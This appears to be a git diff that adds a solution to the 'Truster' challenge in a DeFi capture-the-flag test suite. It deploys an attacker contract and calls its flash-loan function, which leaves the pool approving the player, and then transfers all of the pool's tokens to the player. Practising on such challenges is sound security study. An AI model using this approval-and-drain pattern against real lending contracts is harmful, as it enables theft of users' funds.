@@ -22,7 +22,14 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** Attack Vector: Open function data */
+        this.attacker = await (await ethers.getContractFactory('AttackerTrusterLenderPool', player)).deploy(pool.address, token.address);
+        //make approval
+        await this.attacker.connect(player).attackFlashLoan(0);
+        //transfer tokens to myself
+        expect(await token.allowance(pool.address, player.address)).to.eq(TOKENS_IN_POOL);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+        
     });
 
     after(async function () {
